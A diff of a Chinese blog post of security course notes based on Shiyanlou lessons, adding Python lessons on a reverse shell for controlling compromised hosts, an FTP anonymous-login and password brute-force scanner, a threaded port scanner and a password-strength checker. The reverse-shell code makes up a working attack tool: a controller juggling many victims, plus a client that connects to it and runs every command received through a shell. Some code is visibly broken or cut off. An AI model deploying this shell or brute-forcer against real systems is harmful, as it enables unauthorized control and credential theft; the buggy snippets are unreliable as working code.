@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Skyla Sun">
   <meta name="keywords" content="">
-  <title>实验楼-信息安全课程 - DeepDeer</title>
+  <title>实验楼-信息安全课程系列-Python - DeepDeer</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -148,7 +148,7 @@
           <div class="container text-center white-text fadeInUp">
             <span class="h2" id="subtitle">
               
-                实验楼-信息安全课程
+                实验楼-信息安全课程系列-Python
               
             </span>
 
@@ -167,7 +167,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.3k 字
+      3.7k 字
     </span>
   
 
@@ -177,7 +177,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      18
+      52
        分钟
     </span>
   
@@ -208,7 +208,7 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <p>本文中大部分相关知识及代码均来自<a href="https://www.shiyanlou.com/" target="_blank" rel="noopener">实验楼</a>。</p>
+              <p>本文中大部分相关知识及代码均来自<a href="https://www.shiyanlou.com/" target="_blank" rel="noopener">实验楼</a>。参考书目《Python绝技：运用Python成为顶级黑客》</p>
 <h2 id="第一课-Python实现DDoS攻击"><a href="#第一课-Python实现DDoS攻击" class="headerlink" title="第一课. Python实现DDoS攻击"></a>第一课. Python实现DDoS攻击</h2><p><strong>关键词</strong>：SYN泛洪，Scapy，argparse模块，socket模块</p>
 <h3 id="一-基础知识"><a href="#一-基础知识" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>SYN泛洪攻击</strong>，一种常见的DoS方式。通过发送大量伪造的TCP连接请求，使被攻击主机资源耗尽（CPU满负荷或内存不足）。具体来讲，在TCP三次握手过程中，客户端向服务器发送SYN报文后，不再响应服务器的回应报文。而服务器会在协议栈留出缓冲区存储握手过程，大量的连接请求都挂起在半连接状态。</p>
 <div align="center">
@@ -368,6 +368,328 @@ curProcess = <span class="hljs-literal">None</span>
 
 
 
+<h2 id="第二课-Python实现可控肉鸡的反向Shell"><a href="#第二课-Python实现可控肉鸡的反向Shell" class="headerlink" title="第二课. Python实现可控肉鸡的反向Shell"></a>第二课. Python实现可控肉鸡的反向Shell</h2><p><strong>关键词</strong>：subprocess模块，socket模块</p>
+<p>本项目与上一个项目本质相同；区别在于，本项目是肉鸡主动连接控制端后，执行控制端发送过来的任何命令。</p>
+<h3 id="一-基础知识-1"><a href="#一-基础知识-1" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>C/S架构</strong>，很多远程控制工具都是基于C/S架构开发的。通常情况下Client是控制端，Server是被控端。反向连接的意思就是Client作为被控端，尽管在内网中，依然可以通过内网端口映射、动态域名等处理后，进行连接。</p>
+<p><strong>subprocess.Popen()</strong>函数，可以实现，一个新的进程中启动一个子程序，第一个参数是子程序的名字，shell=True说明程序在Shell中执行。stdout，stderr，stdin的值都是subprocess.PIPE表示用管道的形式与子进程交互。</p>
+<h3 id="二-具体实现-1"><a href="#二-具体实现-1" class="headerlink" title="二. 具体实现"></a>二. 具体实现</h3><p>首先，控制端需要实现：1）等待被控端连接；2）给被控端发送Shell命令；3）选择和切换当前要接收Shell命令的肉鸡。</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> threading
+
+clientList = []
+curClient = <span class="hljs-literal">None</span>
+quitThread = <span class="hljs-literal">False</span>
+lock = threading.Lock()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wait_connect</span><span class="hljs-params">(sk)</span>:</span>
+    <span class="hljs-keyword">global</span> clientList
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> quitThread:
+        <span class="hljs-keyword">if</span> len(clientList) == <span class="hljs-number">0</span>:
+            print(<span class="hljs-string">'Waiting for connection...'</span>)
+        sock, addr = sk.accept()
+        print(<span class="hljs-string">'New client %s is connected'</span> %(addr[<span class="hljs-number">0</span>]))
+        lock.acquire()
+        clientList.append((sock, addr))
+        lock.release()
+        
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">select_client</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">global</span> clientList
+    <span class="hljs-keyword">global</span> curClient
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(clientList)):
+        print(<span class="hljs-string">'[%i]-&gt;%s'</span> % (i, str(clientList[i][<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])))
+    print(<span class="hljs-string">'Select a client!'</span>)
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        num = input(<span class="hljs-string">'client num:'</span>)
+        <span class="hljs-keyword">if</span> int(num) &gt;= len(clientList):
+            print(<span class="hljs-string">'Please input a correct num'</span>)
+            <span class="hljs-keyword">continue</span>
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">break</span>
+    curClient = clientList[int(num)]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shell_ctrl</span><span class="hljs-params">(socket, addr)</span>:</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        com = input(str(addr[<span class="hljs-number">0</span>]) + <span class="hljs-string">':~#'</span>)
+        <span class="hljs-keyword">if</span> com == <span class="hljs-string">'!ch'</span>:
+            select_client()
+            <span class="hljs-keyword">return</span>
+        <span class="hljs-keyword">if</span> com == <span class="hljs-string">'!q'</span>:
+            quietThread = <span class="hljs-literal">True</span>
+            print(<span class="hljs-string">'='</span>*<span class="hljs-number">40</span>)
+            exit(<span class="hljs-number">0</span>)
+        socket.send(com.encode(<span class="hljs-string">'utf-8'</span>))
+        data = socket.recv(<span class="hljs-number">1024</span>)
+        print(data.decode(<span class="hljs-string">'utf-8'</span>))
+ 
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((<span class="hljs-string">'0.0.0.0'</span>,<span class="hljs-number">7676</span>))
+    s.listen(<span class="hljs-number">1024</span>)
+    t = threading.Thread(target=wait_connect, args=(s,))
+    t.start()
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        <span class="hljs-keyword">if</span> len(clientList) &gt; <span class="hljs-number">0</span>:
+            select_client()
+            shell_ctrl(curClient[<span class="hljs-number">0</span>],curClient[<span class="hljs-number">1</span>])
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    main()</code></pre>
+
+<p>被控端需要实现：1）连接控制端；2）执行控制端发送的命令；3）发送执行结果。</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> subprocess
+<span class="hljs-keyword">import</span> argparse
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> threading
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connectHost</span><span class="hljs-params">(ht,pt)</span>:</span>
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((ht, int(pt)))
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        data = sock.recv(<span class="hljs-number">1024</span>)
+        data = data.decode(<span class="hljs-string">'utf-8'</span>)
+        comRst = subprocess.Popen(data, shell= <span class="hljs-literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        m_stdout, m_stderr = comRst.communicate()
+        sock.send(m_stdout.decode(sys.getfilesystemencoding()).encode(<span class="hljs-string">'utf-8'</span>))
+        time.sleep(<span class="hljs-number">1</span>)
+    sock.close()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
+    parser = argparse.ArgumentParser()
+    parser.add_argument(<span class="hljs-string">'-H'</span>, dest=<span class="hljs-string">'hostName'</span>, help=<span class="hljs-string">'Host Name'</span>)
+    parser.add_argument(<span class="hljs-string">'-p'</span>, dest=<span class="hljs-string">'conPort'</span>, help=<span class="hljs-string">'Host Port'</span>)
+    args = parser.parse_args()
+    host = args.hostName
+    port = args.conPort
+    <span class="hljs-keyword">if</span> host == <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> port == <span class="hljs-literal">None</span>:
+        print(parser.parse_args([<span class="hljs-string">'-h'</span>]))
+        exit(<span class="hljs-number">0</span>)
+    connectHost(host, port)
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    main()</code></pre>
+
+
+
+<h2 id="第三课-实现FTP扫描器"><a href="#第三课-实现FTP扫描器" class="headerlink" title="第三课. 实现FTP扫描器"></a>第三课. 实现FTP扫描器</h2><p><strong>关键字</strong>：Ftplib</p>
+<h3 id="一-基础知识-2"><a href="#一-基础知识-2" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>FTP服务器</strong>是在互联网上提供文件存储和访问的计算机，依照FTP协议（文件传输协议）提供服务。FTP仅基于TCP服务，不支持UDP，使用两个端口，一个数据端口（20，不定），一个命令端口（21）。FTP有两种工作模式：</p>
+<ol>
+<li>主动FTP，做静态映射时只开放21端口即可，它会用20端口和客户端主动发起连接。</li>
+<li>被动FTP，服务器控制端口是21，数据端口是随机的，而且是客户端去连接相应的端口，仅做静态映射是不够的，需要DMZ。</li>
+</ol>
+<p><strong>FTP扫描</strong>主要从两个方面着手：1）扫描匿名FTP；2）扫描FTP弱口令。</p>
+<p>FTP匿名登录主要应用于批量扫描。因为很多网站都开放FTP服务方便用户下载资源，而且有的网络管理员为了方便网站访问软件的更新也开放了FTP匿名登录。</p>
+<p>FTP弱口令扫描依赖于用户名和密码字典，本质为暴力破解。</p>
+<p><strong>pyftpdlib</strong>搭建FTP服务器。pip安装pyftpdlib后，按一下命令启动ftp服务器，默认允许匿名登录。<code>sudo python3 -m pyftpdlib -p 21</code></p>
+<h3 id="二-具体实现-2"><a href="#二-具体实现-2" class="headerlink" title="二. 具体实现"></a>二. 具体实现</h3><pre><code class="hljs python"><span class="hljs-keyword">from</span> ftplib <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> argparse
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-comment">#匿名登录，直接使用python ftplib库中的FTP这个类</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">anonScan</span><span class="hljs-params">(hostname)</span>:</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">with</span> FTP(hostname) <span class="hljs-keyword">as</span> ftp:
+            ftp.login()  <span class="hljs-comment">#不带参数，匿名的登录</span>
+            print(<span class="hljs-string">'\n[*]'</span> + str(hostname) + <span class="hljs-string">"FTP Anonymous login!"</span>)
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        print(<span class="hljs-string">'\n[-]'</span> + str(hostname) + <span class="hljs-string">'FTP Anonymous fail.'</span>)
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+<span class="hljs-comment">#弱口令扫描</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vlcLogin</span><span class="hljs-params">(hostname, pwdFile)</span>:</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">with</span> open(pwdFile,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
+            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> pf.readlines():
+                time.sleep(<span class="hljs-number">1</span>)
+                userName = line.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">0</span>]
+                passWord = line.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">1</span>].strip(<span class="hljs-string">'\r'</span>).strip(<span class="hljs-string">'\n'</span>)
+                print(<span class="hljs-string">'[+] Trying:'</span> + userName + <span class="hljs-string">':'</span> +password)
+                <span class="hljs-keyword">try</span>:
+                    <span class="hljs-keyword">with</span> FTP(hostname) <span class="hljs-keyword">as</span> ftp:
+                        ftp.login(userName, passWord)
+                        print(<span class="hljs-string">'\n[+]'</span> +str(hostname)+<span class="hljs-string">'FTP Login successful'</span>)
+                        <span class="hljs-keyword">return</span>(userName, passWord)
+                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+                    <span class="hljs-keyword">pass</span>
+    <span class="hljs-keyword">except</span> IOErros <span class="hljs-keyword">as</span> e:
+        print(<span class="hljs-string">'Error, the passwd file does not exist'</span>)
+    print(<span class="hljs-string">'\n[-] Cannot crack the FTP password'</span>)
+    <span class="hljs-keyword">return</span>(<span class="hljs-literal">None</span>,<span class="hljs-literal">None</span>)
+ 
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
+    parser = argparse.ArgumentParser(description=<span class="hljs-string">'FTP Scanner'</span>)
+    parser.add_argument(<span class="hljs-string">'-H'</span>,dest=<span class="hljs-string">'hostName'</span>,help=<span class="hljs-string">'The host list'</span>)
+    parsee.add_argument(<span class="hljs-string">'-f'</span>,dest=<span class="hljs-string">'pwdFile'</span>,help=<span class="hljs-string">'Password file'</span>)
+    options = <span class="hljs-literal">None</span>
+    <span class="hljs-keyword">try</span>:
+        options = parser.parse_args()
+    <span class="hljs-keyword">except</span>:
+        print(parser.parse_args([<span class="hljs-string">'-h'</span>]))
+        exit(<span class="hljs-number">0</span>)
+    hostNames = str(options.hostName).split(<span class="hljs-string">','</span>)
+    pwdFile = options.pwdFile
+    <span class="hljs-keyword">if</span> hostNames == [<span class="hljs-string">'None'</span>]:
+        print(parser.parse_args([<span class="hljs-string">'-h'</span>]))
+        exit(<span class="hljs-number">0</span>)
+    <span class="hljs-keyword">for</span> hostName <span class="hljs-keyword">in</span> hostNames:
+        username = <span class="hljs-literal">None</span>
+        password = <span class="hljs-literal">None</span>
+        <span class="hljs-keyword">if</span> anonScan(hostName) == <span class="hljs-literal">True</span>:
+            print(<span class="hljs-string">'Host'</span>: + hostName + <span class="hljs-string">'can login anonymously'</span>)
+        <span class="hljs-keyword">elif</span> pwdFile != <span class="hljs-literal">None</span>:
+            (username, password) = vlcLogin(hostName, pwdFile)
+            <span class="hljs-keyword">if</span> password != <span class="hljs-literal">None</span>:
+                print(<span class="hljs-string">'[+] Done:'</span> + userName + <span class="hljs-string">':'</span> +password)
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    main()</code></pre>
+
+<h2 id="第四课-Python端口扫描器"><a href="#第四课-Python端口扫描器" class="headerlink" title="第四课. Python端口扫描器"></a>第四课. Python端口扫描器</h2><p><strong>关键字</strong>：python-nmap包，_thread多线程</p>
+<h3 id="一-基础知识-3"><a href="#一-基础知识-3" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>端口扫描</strong>，向客户端一定范围的服务器端口发送请求，探测服务器或主机端口开放情况，常用于计算机管理员确认安全策略或攻击者识别目标主机上的可运行的网络服务。主要用途还是确认远程机器上某个服务的可用性。</p>
+<p><strong>端口清扫</strong>（Portsweep），向多个主机的某个端口发送请求。</p>
+<p>常用扫描方式为：1）连接扫描；2）SYN扫描。</p>
+<p><strong>连接扫描</strong>，使用TCP连接，利用操作系统原生的网络功能，通常作为SYN扫描的额替代选项。如果端口开放，操作系统可以完成TCP三次握手，然后扫描工具会关闭刚建立的连接，防止DoS。但是由于使用了原生系统的功能，我们无法进行底层控制，而且这种扫描方式容易被发现，且记录发送者IP。</p>
+<p><strong>SYN扫描</strong>，自行生成、发送IP数据包，并监控其回应。此种方式不建立完整TCP连接，也被称为“半开放扫描“。扫描工具发送SYN包，如果端口开放则回复SYN-ACK包，此时扫描端回应RST包并在握手前关闭连接；如果端口没开放，则会返回RST包。这种方法劣势在于RST包可能会导致网络堵塞。</p>
+<p><strong>python-nmap包</strong>，Nmap是一款用于网络发现和安全审计的网络安全工具</p>
+<h3 id="二-具体实现-3"><a href="#二-具体实现-3" class="headerlink" title="二. 具体实现"></a>二. 具体实现</h3><p>本次实现连接扫描方式。直接将目标地址和端口范围作为参数。<code>python3 port_scan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt;</code></p>
+<p>在基础功能的基础上，为提高性能，考虑采用多线程的方式。注意print的时候要加锁，不然多个输出可能混合在一起。锁需要在程序启动时创建，从而让新建线程共享。但这个程序中没有限制线程数，如果系统中线程过多会影响性能.</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> _thread <span class="hljs-keyword">as</span> thread
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_test</span><span class="hljs-params">(port)</span>:</span>
+    sock = socket(AF_INET, SOCK_STREAM)
+    sock.settimeout(<span class="hljs-number">10</span>)
+    result = sock.connect_ex((target_ip, port))
+    <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:
+        lock.acquire()
+        print(<span class="hljs-string">'Opened port'</span>,port)
+        lock.release()
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    host = sys.argv[<span class="hljs-number">1</span>]
+    portstrs = sys.argv[<span class="hljs-number">2</span>].split(<span class="hljs-string">'-'</span>)
+    start_port = int(portstrs[<span class="hljs-number">0</span>])
+    end_port = int(portstrs[<span class="hljs-number">1</span>])
+
+    target_ip = gethostbyname(host)
+    lock = thread.allocate_lock()
+    opened_ports = []
+<span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> range(start_port, end_port):
+    thread.start_new_thread(tcp_test,(port,))</code></pre>
+
+<p>pythonl-nmap使用示例，详细使用多看文档。</p>
+<pre><code class="hljs python"><span class="hljs-comment"># sudo apt-get install nmap python3-nmap</span>
+
+<span class="hljs-keyword">import</span> nmap
+nm = nmap.PortScanner()
+nm.scan(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-string">'22-100'</span>)
+nm.command_line()
+nm.scaninfo()
+nm.all_hosts()</code></pre>
+
+<p>此项目还可以加入其它改进：1）增加GUI进行手动添加扫描范围和主机；2）生成csv报告；3）后台扫描，报告以邮件形式发给管理员。</p>
+<h2 id="第五课-密码强度检测"><a href="#第五课-密码强度检测" class="headerlink" title="第五课. 密码强度检测"></a>第五课. 密码强度检测</h2><p><strong>关键词</strong>：正则表达式，python库</p>
+<p>面向API的编程方法——先设计API，再实现代码。本次课程实现一个可以给其它程序员使用的简单的库。</p>
+<h3 id="一-基础知识-4"><a href="#一-基础知识-4" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>密码复杂度</strong>，长度，大小写字母，数字和特殊字符，密码包含的特征越多，强度越高。Github上已经有人建立了<a href="https://github.com/iryndin/10K-Most-Popular-Passwords" target="_blank" rel="noopener">常用密码表</a>。</p>
+<p><strong>正则表达式</strong>，使用re模块的compile方法编译密码特生，之后调用search方法即可。</p>
+<pre><code class="hljs python">NUMBER = re.compile(<span class="hljs-string">r'[0-9]'</span>)
+LOWER_CASE = re.compile(<span class="hljs-string">r'[a-z]'</span>)
+UPPER_CASE = re.compile(<span class="hljs-string">r'[A-Z]'</span>)
+OTHERS = re.compile(<span class="hljs-string">r'[^0-9a-zA-Z]'</span>)</code></pre>
+
+<h3 id="二-具体实现-4"><a href="#二-具体实现-4" class="headerlink" title="二. 具体实现"></a>二. 具体实现</h3><p>首先编写一个模块</p>
+<pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python3</span>
+<span class="hljs-string">"""</span>
+<span class="hljs-string">check</span>
+<span class="hljs-string">~~~~~~~</span>
+<span class="hljs-string">check if your password safe.</span>
+<span class="hljs-string">"""</span>
+
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> json
+
+__all__ = [<span class="hljs-string">'password'</span>]
+NUMBER = re.compile(<span class="hljs-string">r'[0-9]'</span>)
+LOWER_CASE = re.compile(<span class="hljs-string">r'[a-z]'</span>)
+UPPER_CASE = re.compile(<span class="hljs-string">r'[A-Z]'</span>)
+OTHERS = re.compile(<span class="hljs-string">r'[^0-9a-zA-Z]'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_common_password</span><span class="hljs-params">()</span>:</span>
+    words = []
+    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'10k_most_common.txt'</span>) <span class="hljs-keyword">as</span> f:
+        <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> f.readlines():
+            words.append(word.strip().decode(encoding=<span class="hljs-string">'utf-8'</span>))
+    <span class="hljs-keyword">return</span> words
+
+COMMON_WORDS = load_common_password()
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Strength</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, valid, strength,message)</span>:</span>
+        self.valid = valid         <span class="hljs-comment">#是否有效</span>
+        self.strength = strength   <span class="hljs-comment">#密码强度</span>
+        self.message = message     <span class="hljs-comment">#提示信息</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-keyword">return</span> self.strength
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-keyword">return</span> self.message
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bool__</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-keyword">return</span> self.valid
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Password</span>:</span>
+    TERRIBLE = <span class="hljs-number">0</span>
+    SIMPLE = <span class="hljs-number">0</span>
+    MEDIUM = <span class="hljs-number">2</span>
+    STRONG = <span class="hljs-number">3</span>
+    
+<span class="hljs-meta">    @staticmethod</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_regular</span><span class="hljs-params">(input)</span>:</span>  <span class="hljs-comment">#判定是否是按键盘顺序的密码</span>
+        reverse = input[::<span class="hljs-number">-1</span>]
+        regular = <span class="hljs-string">''</span>.join([<span class="hljs-string">'qwertyuio'</span>,<span class="hljs-string">'asdfghjkl'</span>,<span class="hljs-string">'zxcvbnm'</span>])
+        <span class="hljs-keyword">return</span> input <span class="hljs-keyword">in</span> regular <span class="hljs-keyword">or</span> reverse <span class="hljs-keyword">in</span> regular
+<span class="hljs-meta">    @staticmethod</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_by_step</span><span class="hljs-params">(input)</span>:</span> <span class="hljs-comment">#是否按照ASCII等差数列</span>
+        delta = ord(input[<span class="hljs-number">1</span>]) - ord(input[<span class="hljs-number">0</span>])
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,len(input)):
+            <span class="hljs-keyword">if</span> ord(input[i]) - ord(input[i<span class="hljs-number">-1</span>]) != delta:
+                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+<span class="hljs-meta">    @staticmethod</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_common</span><span class="hljs-params">(input)</span>:</span>
+        <span class="hljs-keyword">return</span> input <span class="hljs-keyword">in</span> COMMON_WORDS
+    
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span><span class="hljs-params">(self,input,min_length=<span class="hljs-number">6</span>,min_types=<span class="hljs-number">3</span>,level=STRONG)</span>:</span>
+        <span class="hljs-keyword">if</span> len(input) &lt; min_length:
+            <span class="hljs-keyword">return</span> Strength(<span class="hljs-literal">False</span>, <span class="hljs-string">'terrible'</span>,<span class="hljs-string">'密码太短'</span>)
+        <span class="hljs-keyword">if</span> self.is_regular(input) <span class="hljs-keyword">or</span> self.is_by_step(input):
+            <span class="hljs-keyword">return</span> Strength(<span class="hljs-literal">False</span>, <span class="hljs-string">'simple'</span>, <span class="hljs-string">'密码有规则'</span>)
+        <span class="hljs-keyword">if</span> self.is_common(input):
+            <span class="hljs-keyword">return</span> Strength(<span class="hljs-literal">False</span>,<span class="hljs-string">'simple'</span>,<span class="hljs-string">'密码很常见'</span>)
+        types = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">if</span> NUMBER.search(input):
+            types += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">if</span> LOWER_CASE.search(input):
+            types += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">if</span> UPPER_CASE.search(input):
+            types +=<span class="hljs-number">1</span>
+        <span class="hljs-keyword">if</span> OTHERS.search(input):
+            types +=<span class="hljs-number">1</span>
+        <span class="hljs-keyword">if</span> types &lt; <span class="hljs-number">2</span>:
+            <span class="hljs-keyword">return</span> Strength(level &lt;= self.SIMPLE, <span class="hljs-string">'simple'</span>,<span class="hljs-string">'密码太简单'</span>)
+        <span class="hljs-keyword">if</span> types &lt; min_types:
+            <span class="hljs-keyword">return</span> Strength(level &lt;= self.MEDIUM, )</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -401,6 +723,12 @@ curProcess = <span class="hljs-literal">None</span>
                 <div class="post-prevnext row">
                   <div class="post-prev col-6">
                     
+                    
+                      <a href="/2020/07/08/sec-geek/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Web安全攻防实战[1]-极客时间</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </div>
                   <div class="post-next col-6">
